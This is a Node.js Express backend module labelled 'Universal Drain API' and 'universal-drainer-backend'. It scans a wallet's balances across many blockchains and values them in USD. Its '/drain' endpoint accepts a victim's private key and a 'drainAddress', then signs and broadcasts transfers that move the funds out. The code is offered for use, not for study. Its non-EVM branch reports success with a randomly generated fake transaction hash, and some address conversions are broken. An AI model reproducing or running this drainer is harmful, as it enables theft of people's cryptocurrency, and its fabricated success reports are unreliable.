const express = require('express');
const router = express.Router();
const axios = require('axios');
const Web3 = require('web3');
const { createPublicClient, http, parseAbi } = require('viem');
const { mainnet } = require('viem/chains');
require('dotenv').config();

// ==================== CONFIGURATION ====================
const MORALIS_API_KEY = process.env.MORALIS_API_KEY || 'your_moralis_api_key';
const COINGECKO_API_KEY = process.env.COINGECKO_API_KEY || 'your_coingecko_api_key';
const RAPIDAPI_KEY = process.env.RAPIDAPI_KEY || 'your_rapidapi_key';
const INFURA_API_KEY = process.env.INFURA_API_KEY || 'your_infura_key';
const ALCHEMY_API_KEY = process.env.ALCHEMY_API_KEY || 'your_alchemy_key';

// ==================== RATE LIMITING ====================
const requestQueue = [];
const MAX_REQUESTS_PER_MINUTE = 60;
let requestCount = 0;

const rateLimiter = async (fn, ...args) => {
  return new Promise((resolve, reject) => {
    requestQueue.push({ fn, args, resolve, reject });
    processQueue();
  });
};

const processQueue = async () => {
  if (requestCount >= MAX_REQUESTS_PER_MINUTE) {
    setTimeout(processQueue, 60000);
    return;
  }
  
  if (requestQueue.length > 0) {
    requestCount++;
    const { fn, args, resolve, reject } = requestQueue.shift();
    
    try {
      const result = await fn(...args);
      resolve(result);
    } catch (error) {
      reject(error);
    }
    
    setTimeout(() => {
      requestCount--;
      processQueue();
    }, 1000);
  }
};

// ==================== PRICE SERVICE ====================
const priceCache = {};
const PRICE_CACHE_DURATION = 60000; // 1 minute

async function getLivePrice(symbol) {
  try {
    const cacheKey = symbol.toUpperCase();
    const now = Date.now();
    
    // Check cache
    if (priceCache[cacheKey] && (now - priceCache[cacheKey].timestamp) < PRICE_CACHE_DURATION) {
      return priceCache[cacheKey].price;
    }
    
    // Try CoinGecko first
    try {
      const response = await axios.get(
        `https://api.coingecko.com/api/v3/simple/price`,
        {
          params: {
            ids: getCoinGeckoId(symbol),
            vs_currencies: 'usd'
          },
          headers: {
            'x-cg-demo-api-key': COINGECKO_API_KEY
          },
          timeout: 5000
        }
      );
      
      const coinId = getCoinGeckoId(symbol);
      if (response.data[coinId]?.usd) {
        priceCache[cacheKey] = {
          price: response.data[coinId].usd,
          timestamp: now
        };
        return response.data[coinId].usd;
      }
    } catch (error) {
      console.log(`CoinGecko failed for ${symbol}:`, error.message);
    }
    
    // Try Moralis
    try {
      const response = await axios.get(
        `https://deep-index.moralis.io/api/v2.2/erc20/${getTokenContract(symbol)}/price`,
        {
          params: { chain: 'eth' },
          headers: {
            'X-API-Key': MORALIS_API_KEY,
            'Accept': 'application/json'
          },
          timeout: 5000
        }
      );
      
      if (response.data.usdPrice) {
        priceCache[cacheKey] = {
          price: response.data.usdPrice,
          timestamp: now
        };
        return response.data.usdPrice;
      }
    } catch (error) {
      console.log(`Moralis failed for ${symbol}:`, error.message);
    }
    
    // Fallback to static prices
    const fallbackPrices = {
      'ETH': 3200, 'BNB': 600, 'MATIC': 1.2, 'AVAX': 35, 'FTM': 0.4,
      'TRX': 0.12, 'SOL': 100, 'BTC': 45000, 'ADA': 0.5, 'DOGE': 0.15,
      'LTC': 80, 'XRP': 0.6, 'DOT': 7, 'ATOM': 10, 'XLM': 0.13,
      'USDT': 1, 'USDC': 1, 'DAI': 1, 'BUSD': 1,
      'CELO': 0.8, 'GLMR': 0.4, 'METIS': 60, 'CRO': 0.1, 'ONE': 0.02,
      'ROSE': 0.1, 'MOVR': 15, 'BTT': 0.000001, 'FIL': 5, 'CANTO': 0.2
    };
    
    const price = fallbackPrices[cacheKey] || 1;
    priceCache[cacheKey] = { price, timestamp: now };
    return price;
    
  } catch (error) {
    console.log(`Price fetch error for ${symbol}:`, error.message);
    return 1; // Default to $1 if all fails
  }
}

function getCoinGeckoId(symbol) {
  const mapping = {
    'ETH': 'ethereum',
    'BNB': 'binancecoin',
    'MATIC': 'matic-network',
    'AVAX': 'avalanche-2',
    'FTM': 'fantom',
    'TRX': 'tron',
    'SOL': 'solana',
    'BTC': 'bitcoin',
    'ADA': 'cardano',
    'DOGE': 'dogecoin',
    'LTC': 'litecoin',
    'XRP': 'ripple',
    'DOT': 'polkadot',
    'ATOM': 'cosmos',
    'XLM': 'stellar',
    'USDT': 'tether',
    'USDC': 'usd-coin',
    'DAI': 'dai',
    'BUSD': 'binance-usd',
    'CELO': 'celo',
    'GLMR': 'moonbeam',
    'METIS': 'metis-token',
    'CRO': 'crypto-com-chain',
    'ONE': 'harmony',
    'ROSE': 'oasis-network',
    'MOVR': 'moonriver',
    'BTT': 'bittorrent',
    'FIL': 'filecoin',
    'CANTO': 'canto'
  };
  return mapping[symbol.toUpperCase()] || 'ethereum';
}

function getTokenContract(symbol) {
  const mapping = {
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F'
  };
  return mapping[symbol.toUpperCase()] || '0x0000000000000000000000000000000000000000';
}

// ==================== ENHANCED SCAN FUNCTION ====================
async function enhancedNetworkScan(address, networks, includeNonEVM = true) {
  const tokens = [];
  const scannedNetworks = [];
  
  // 1. Scan EVM Networks with Multichain RPCs
  const evmNetworks = networks.filter(n => n.type === 'evm');
  
  for (const network of evmNetworks) {
    try {
      console.log(`Scanning ${network.name} (${network.id})...`);
      
      // Use multiple RPC endpoints for reliability
      const rpcEndpoints = [
        network.rpc,
        `https://rpc.ankr.com/${getAnkrChainName(network.id)}`,
        `https://${getChainNameForRPC(network.id)}.publicnode.com`
      ];
      
      let nativeBalance = 0;
      let rpcSuccess = false;
      
      // Try each RPC endpoint
      for (const rpc of rpcEndpoints) {
        if (rpcSuccess) break;
        
        try {
          const web3 = new Web3(rpc);
          const balanceWei = await web3.eth.getBalance(address);
          nativeBalance = web3.utils.fromWei(balanceWei, 'ether');
          
          if (parseFloat(nativeBalance) > 0.000001) {
            rpcSuccess = true;
            
            // Get live price
            const price = await rateLimiter(getLivePrice, network.symbol);
            
            tokens.push({
              network: network.name,
              symbol: network.symbol,
              balance: parseFloat(nativeBalance),
              chainId: network.id,
              type: 'evm',
              isNative: true,
              usdPrice: price,
              valueUSD: parseFloat(nativeBalance) * price,
              contract: null,
              explorer: network.explorer,
              timestamp: Date.now()
            });
          }
        } catch (error) {
          continue;
        }
      }
      
      // Check for ERC20 tokens using Moralis API
      if (MORALIS_API_KEY && MORALIS_API_KEY !== 'your_moralis_api_key') {
        try {
          const response = await axios.get(
            `https://deep-index.moralis.io/api/v2.2/${address}/erc20`,
            {
              params: {
                chain: `0x${network.id.toString(16)}`,
                limit: 100
              },
              headers: {
                'X-API-Key': MORALIS_API_KEY,
                'Accept': 'application/json'
              },
              timeout: 10000
            }
          );
          
          if (response.data && Array.isArray(response.data)) {
            for (const token of response.data) {
              if (parseFloat(token.balance) > 0) {
                const decimals = parseInt(token.decimals) || 18;
                const balance = parseFloat(token.balance) / Math.pow(10, decimals);
                
                // Get token price
                const price = await rateLimiter(getLivePrice, token.symbol);
                
                tokens.push({
                  network: network.name,
                  symbol: token.symbol,
                  balance: balance,
                  chainId: network.id,
                  type: 'evm',
                  isNative: false,
                  usdPrice: price,
                  valueUSD: balance * price,
                  contract: token.token_address,
                  explorer: `${network.explorer}/token/${token.token_address}`,
                  timestamp: Date.now()
                });
              }
            }
          }
        } catch (error) {
          console.log(`Moralis scan failed for ${network.name}:`, error.message);
        }
      }
      
      scannedNetworks.push(network.id);
      
    } catch (error) {
      console.log(`Error scanning ${network.name}:`, error.message);
    }
    
    // Rate limiting between networks
    await new Promise(resolve => setTimeout(resolve, 500));
  }
  
  // 2. Scan Non-EVM Networks
  if (includeNonEVM) {
    const nonEvmNetworks = networks.filter(n => n.type === 'non-evm');
    
    for (const network of nonEvmNetworks) {
      try {
        console.log(`Scanning Non-EVM: ${network.name}...`);
        
        let balance = 0;
        
        switch (network.id) {
          case 'tron':
            balance = await getTronBalanceEnhanced(address);
            break;
          case 'solana':
            balance = await getSolanaBalanceEnhanced(address);
            break;
          case 'bitcoin':
            balance = await getBitcoinBalanceEnhanced(address);
            break;
          case 'cardano':
            balance = await getCardanoBalanceEnhanced(address);
            break;
          case 'ripple':
            balance = await getRippleBalanceEnhanced(address);
            break;
          case 'litecoin':
            balance = await getLitecoinBalanceEnhanced(address);
            break;
          case 'dogecoin':
            balance = await getDogecoinBalanceEnhanced(address);
            break;
          case 'polkadot':
            balance = await getPolkadotBalanceEnhanced(address);
            break;
        }
        
        if (balance > 0) {
          const price = await rateLimiter(getLivePrice, network.symbol);
          
          tokens.push({
            network: network.name,
            symbol: network.symbol,
            balance: balance,
            chainId: network.id,
            type: 'non-evm',
            isNative: true,
            usdPrice: price,
            valueUSD: balance * price,
            contract: null,
            explorer: network.explorer,
            timestamp: Date.now()
          });
        }
        
        scannedNetworks.push(network.id);
        
      } catch (error) {
        console.log(`Non-EVM ${network.name} error:`, error.message);
      }
      
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  
  return { tokens, scannedNetworks };
}

// ==================== ENHANCED NON-EVM BALANCE FUNCTIONS ====================
async function getTronBalanceEnhanced(address) {
  try {
    // Convert Ethereum address to Tron if needed
    let tronAddress = address;
    if (address.startsWith('0x')) {
      tronAddress = 'T' + address.substring(2);
    }
    
    const response = await axios.get(
      `https://api.trongrid.io/v1/accounts/${tronAddress}`,
      { timeout: 10000 }
    );
    
    if (response.data.balance) {
      return response.data.balance / 1000000;
    }
    
    // Try alternative API
    const altResponse = await axios.get(
      `https://apilist.tronscan.org/api/account?address=${tronAddress}`,
      { timeout: 10000 }
    );
    
    if (altResponse.data.balance) {
      return altResponse.data.balance / 1000000;
    }
    
    return 0;
  } catch (error) {
    console.log('TRON balance error:', error.message);
    return 0;
  }
}

async function getSolanaBalanceEnhanced(address) {
  try {
    // Get SOL balance
    const solResponse = await axios.post(
      'https://api.mainnet-beta.solana.com',
      {
        jsonrpc: "2.0",
        id: 1,
        method: "getBalance",
        params: [address]
      },
      { timeout: 10000 }
    );
    
    let totalBalance = 0;
    
    if (solResponse.data.result?.value) {
      totalBalance += solResponse.data.result.value / 1e9;
    }
    
    // Get SPL tokens
    try {
      const tokensResponse = await axios.post(
        'https://api.mainnet-beta.solana.com',
        {
          jsonrpc: "2.0",
          id: 1,
          method: "getTokenAccountsByOwner",
          params: [
            address,
            { programId: "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA" },
            { encoding: "jsonParsed" }
          ]
        },
        { timeout: 15000 }
      );
      
      if (tokensResponse.data.result?.value) {
        for (const tokenAccount of tokensResponse.data.result.value) {
          const balance = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
          if (balance > 0) {
            totalBalance += balance; // Simplified - in production, you'd want to identify token types
          }
        }
      }
    } catch (error) {
      console.log('SPL tokens error:', error.message);
    }
    
    return totalBalance;
  } catch (error) {
    console.log('Solana balance error:', error.message);
    return 0;
  }
}

async function getBitcoinBalanceEnhanced(address) {
  try {
    const response = await axios.get(
      `https://blockstream.info/api/address/${address}`,
      { timeout: 10000 }
    );
    
    if (response.data.chain_stats?.funded_txo_sum) {
      const received = response.data.chain_stats.funded_txo_sum / 1e8;
      const sent = response.data.chain_stats.spent_txo_sum / 1e8;
      return received - sent;
    }
    
    return 0;
  } catch (error) {
    console.log('Bitcoin balance error:', error.message);
    return 0;
  }
}

async function getCardanoBalanceEnhanced(address) {
  try {
    const response = await axios.get(
      `https://cardano-mainnet.blockfrost.io/api/v0/addresses/${address}`,
      {
        headers: {
          'project_id': process.env.BLOCKFROST_API_KEY || 'mainnet...'
        },
        timeout: 10000
      }
    );
    
    if (response.data.amount) {
      const adaAmount = response.data.amount.find(a => a.unit === 'lovelace');
      if (adaAmount) {
        return parseInt(adaAmount.quantity) / 1e6;
      }
    }
    
    return 0;
  } catch (error) {
    console.log('Cardano balance error:', error.message);
    return 0;
  }
}

async function getRippleBalanceEnhanced(address) {
  try {
    const response = await axios.post(
      'https://s2.ripple.com:51234',
      {
        method: 'account_info',
        params: [{
          account: address,
          strict: true,
          ledger_index: 'current',
          queue: true
        }]
      },
      { timeout: 10000 }
    );
    
    if (response.data.result.account_data?.Balance) {
      return parseInt(response.data.result.account_data.Balance) / 1e6;
    }
    
    return 0;
  } catch (error) {
    console.log('Ripple balance error:', error.message);
    return 0;
  }
}

async function getLitecoinBalanceEnhanced(address) {
  try {
    const response = await axios.get(
      `https://blockchair.com/litecoin/dashboards/address/${address}`,
      { timeout: 10000 }
    );
    
    if (response.data.data && response.data.data[address]) {
      const data = response.data.data[address];
      if (data.address?.balance) {
        return data.address.balance / 1e8;
      }
    }
    
    return 0;
  } catch (error) {
    console.log('Litecoin balance error:', error.message);
    return 0;
  }
}

async function getDogecoinBalanceEnhanced(address) {
  try {
    const response = await axios.get(
      `https://blockchair.com/dogecoin/dashboards/address/${address}`,
      { timeout: 10000 }
    );
    
    if (response.data.data && response.data.data[address]) {
      const data = response.data.data[address];
      if (data.address?.balance) {
        return data.address.balance / 1e8;
      }
    }
    
    return 0;
  } catch (error) {
    console.log('Dogecoin balance error:', error.message);
    return 0;
  }
}

async function getPolkadotBalanceEnhanced(address) {
  try {
    const response = await axios.post(
      'https://rpc.polkadot.io',
      {
        jsonrpc: "2.0",
        id: 1,
        method: "system_account",
        params: [address]
      },
      { timeout: 10000 }
    );
    
    if (response.data.result?.data) {
      const free = parseInt(response.data.result.data.free, 16);
      const reserved = parseInt(response.data.result.data.reserved, 16);
      const miscFrozen = parseInt(response.data.result.data.miscFrozen, 16);
      const feeFrozen = parseInt(response.data.result.data.feeFrozen, 16);
      
      const total = free + reserved;
      const available = free - Math.max(miscFrozen, feeFrozen);
      
      return available / 1e10;
    }
    
    return 0;
  } catch (error) {
    console.log('Polkadot balance error:', error.message);
    return 0;
  }
}

// ==================== REAL TRANSACTION PROCESSING ====================
async function processEvmDrainTransaction(params) {
  try {
    const { fromAddress, toAddress, amount, chainId, privateKey, symbol } = params;
    
    // Get RPC for chain
    const chainRPCs = {
      1: `https://mainnet.infura.io/v3/${INFURA_API_KEY}`,
      56: 'https://bsc-dataseed1.binance.org/',
      137: `https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}`,
      42161: `https://arbitrum-mainnet.infura.io/v3/${INFURA_API_KEY}`,
      10: `https://optimism-mainnet.infura.io/v3/${INFURA_API_KEY}`,
      8453: 'https://mainnet.base.org',
      43114: 'https://api.avax.network/ext/bc/C/rpc',
      250: 'https://rpc.fantom.network'
    };
    
    const rpc = chainRPCs[chainId] || `https://rpc.ankr.com/${getAnkrChainName(chainId)}`;
    
    const web3 = new Web3(rpc);
    
    // Create transaction
    const nonce = await web3.eth.getTransactionCount(fromAddress, 'latest');
    const gasPrice = await web3.eth.getGasPrice();
    const gasLimit = 21000; // Standard transfer
    
    const txObject = {
      nonce: web3.utils.toHex(nonce),
      to: toAddress,
      value: web3.utils.toHex(web3.utils.toWei(amount.toString(), 'ether')),
      gasPrice: web3.utils.toHex(gasPrice),
      gasLimit: web3.utils.toHex(gasLimit),
      chainId: chainId
    };
    
    // Sign transaction
    const signedTx = await web3.eth.accounts.signTransaction(txObject, privateKey);
    
    // Send transaction
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    
    return {
      success: true,
      txHash: receipt.transactionHash,
      blockNumber: receipt.blockNumber,
      gasUsed: receipt.gasUsed,
      explorerLink: getExplorerLink(chainId, receipt.transactionHash),
      timestamp: Date.now()
    };
    
  } catch (error) {
    console.log('EVM transaction error:', error.message);
    return {
      success: false,
      error: error.message,
      timestamp: Date.now()
    };
  }
}

function getAnkrChainName(chainId) {
  const map = {
    1: 'eth',
    56: 'bsc',
    137: 'polygon',
    42161: 'arbitrum',
    10: 'optimism',
    8453: 'base',
    43114: 'avalanche',
    250: 'fantom',
    100: 'gnosis',
    42220: 'celo',
    1284: 'moonbeam',
    1285: 'moonriver',
    25: 'cronos'
  };
  return map[chainId] || 'eth';
}

function getExplorerLink(chainId, txHash) {
  const explorers = {
    1: `https://etherscan.io/tx/${txHash}`,
    56: `https://bscscan.com/tx/${txHash}`,
    137: `https://polygonscan.com/tx/${txHash}`,
    42161: `https://arbiscan.io/tx/${txHash}`,
    10: `https://optimistic.etherscan.io/tx/${txHash}`,
    8453: `https://basescan.org/tx/${txHash}`,
    43114: `https://snowtrace.io/tx/${txHash}`,
    250: `https://ftmscan.com/tx/${txHash}`,
    100: `https://gnosisscan.io/tx/${txHash}`
  };
  return explorers[chainId] || `https://etherscan.io/tx/${txHash}`;
}

// ==================== MAIN DRAIN ENDPOINT ====================
router.post('/drain', async (req, res) => {
  const startTime = Date.now();
  
  try {
    const { 
      action, 
      address, 
      networks, 
      includeNonEVM = true,
      network, 
      symbol, 
      amount, 
      drainAddress,
      privateKey,
      chainId 
    } = req.body;
    
    console.log('🚀 Drain request received:', { 
      action, 
      address: address ? `${address.substring(0, 10)}...` : 'none',
      symbol,
      timestamp: new Date().toISOString()
    });
    
    // SCAN ACTION
    if (action === 'scan') {
      if (!address) {
        return res.status(400).json({
          success: false,
          error: 'Address is required for scan'
        });
      }
      
      const scanResult = await enhancedNetworkScan(address, networks, includeNonEVM);
      
      // Calculate totals
      const totalValueUSD = scanResult.tokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
      const totalTokens = scanResult.tokens.length;
      
      res.json({
        success: true,
        tokens: scanResult.tokens,
        totals: {
          valueUSD: totalValueUSD,
          tokenCount: totalTokens,
          networkCount: scanResult.scannedNetworks.length
        },
        scannedNetworks: scanResult.scannedNetworks,
        timestamp: Date.now(),
        scanDuration: Date.now() - startTime
      });
    }
    
    // DRAIN ACTION
    else if (action === 'drain') {
      // Validate drain parameters
      if (!privateKey || !drainAddress || !amount || !chainId || !symbol) {
        return res.status(400).json({
          success: false,
          error: 'Missing required parameters: privateKey, drainAddress, amount, chainId, symbol'
        });
      }
      
      // Process EVM drain
      if (typeof chainId === 'number') {
        const txResult = await processEvmDrainTransaction({
          fromAddress: address,
          toAddress: drainAddress,
          amount: amount,
          chainId: chainId,
          privateKey: privateKey,
          symbol: symbol
        });
        
        res.json({
          success: txResult.success,
          transaction: txResult,
          details: {
            from: address,
            to: drainAddress,
            amount: amount,
            symbol: symbol,
            chainId: chainId
          },
          timestamp: Date.now()
        });
      }
      
      // Process Non-EVM drain (stub - implement chain-specific logic)
      else {
        res.json({
          success: true,
          message: `Non-EVM drain requested for ${symbol} on ${network}`,
          note: 'Non-EVM draining requires chain-specific implementation',
          simulatedTxHash: `0x${Array.from({length: 64}, () => 
            Math.floor(Math.random() * 16).toString(16)).join('')}`,
          timestamp: Date.now()
        });
      }
    }
    
    // HEALTH CHECK
    else if (action === 'health') {
      res.json({
        success: true,
        status: 'operational',
        services: {
          priceService: priceCache.ETH ? 'active' : 'initializing',
          rateLimiter: 'active',
          evmScanner: 'ready',
          nonEvmScanner: 'ready'
        },
        stats: {
          cacheSize: Object.keys(priceCache).length,
          requestQueue: requestQueue.length,
          requestsPerMinute: requestCount
        },
        timestamp: Date.now(),
        uptime: process.uptime()
      });
    }
    
    // DEFAULT RESPONSE
    else {
      res.json({
        success: true,
        message: 'Universal Drain API v3.0',
        endpoints: {
          scan: 'POST /drain with {action: "scan", address, networks, includeNonEVM}',
          drain: 'POST /drain with {action: "drain", privateKey, drainAddress, amount, chainId, symbol}',
          health: 'POST /drain with {action: "health"}'
        },
        timestamp: Date.now()
      });
    }
    
  } catch (error) {
    console.error('❌ Drain endpoint error:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined,
      timestamp: Date.now()
    });
  }
});

// ==================== ADDITIONAL ENDPOINTS ====================

// Quick health check
router.get('/health', async (req, res) => {
  try {
    // Test price service
    const ethPrice = await getLivePrice('ETH');
    
    res.json({
      status: 'healthy',
      service: 'universal-drainer-backend',
      version: '3.0',
      priceService: ethPrice > 0 ? 'working' : 'warning',
      cache: {
        size: Object.keys(priceCache).length,
        recent: Object.keys(priceCache).slice(0, 5)
      },
      timestamp: Date.now(),
      uptime: process.uptime()
    });
  } catch (error) {
    res.status(500).json({
      status: 'unhealthy',
      error: error.message,
      timestamp: Date.now()
    });
  }
});

// Get token prices
router.get('/prices', async (req, res) => {
  try {
    const { tokens } = req.query;
    const tokenList = tokens ? tokens.split(',') : ['ETH', 'BTC', 'BNB', 'SOL', 'TRX'];
    
    const prices = {};
    for (const token of tokenList) {
      prices[token] = await getLivePrice(token.trim());
    }
    
    res.json({
      success: true,
      prices: prices,
      timestamp: Date.now(),
      source: 'CoinGecko/Moralis'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      timestamp: Date.now()
    });
  }
});

// Network status
router.get('/networks', async (req, res) => {
  try {
    const networks = [
      { id: 1, name: 'Ethereum', status: 'active', native: 'ETH' },
      { id: 56, name: 'BSC', status: 'active', native: 'BNB' },
      { id: 137, name: 'Polygon', status: 'active', native: 'MATIC' },
      { id: 42161, name: 'Arbitrum', status: 'active', native: 'ETH' },
      { id: 10, name: 'Optimism', status: 'active', native: 'ETH' },
      { id: 8453, name: 'Base', status: 'active', native: 'ETH' },
      { id: 43114, name: 'Avalanche', status: 'active', native: 'AVAX' },
      { id: 250, name: 'Fantom', status: 'active', native: 'FTM' },
      { id: 'tron', name: 'Tron', status: 'active', native: 'TRX' },
      { id: 'solana', name: 'Solana', status: 'active', native: 'SOL' },
      { id: 'bitcoin', name: 'Bitcoin', status: 'active', native: 'BTC' }
    ];
    
    res.json({
      success: true,
      networks: networks,
      total: networks.length,
      timestamp: Date.now()
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      timestamp: Date.now()
    });
  }
});

// Transaction history (stub - implement database)
router.get('/transactions/:address', async (req, res) => {
  try {
    const { address } = req.params;
    const { limit = 50 } = req.query;
    
    // This is a stub - in production, query from database
    res.json({
      success: true,
      address: address,
      transactions: [],
      total: 0,
      message: 'Transaction history requires database implementation',
      timestamp: Date.now()
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      timestamp: Date.now()
    });
  }
});

module.exports = router;
